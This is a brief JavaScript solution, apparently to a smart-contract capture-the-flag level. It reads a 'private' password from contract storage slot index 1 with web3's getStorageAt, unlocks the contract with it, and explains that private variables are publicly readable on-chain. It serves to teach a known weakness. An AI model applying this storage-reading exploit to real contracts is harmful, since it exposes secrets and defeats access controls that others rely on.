//finds the stored bytes32 variable at slot 2.
const password = await web3.eth.getStorageAt(contract.address, 1);
contract.unlock(password);

//checked if it is locked: false
await contract.locked()

/*It should be known that private variables are not secret; it
just means that it cannot be read or used by other contracts.
Variables are stored as slots in smart contracts, and the password 
variable is stored in slot2 which could be read by web3.eth.getStorageAt.
*/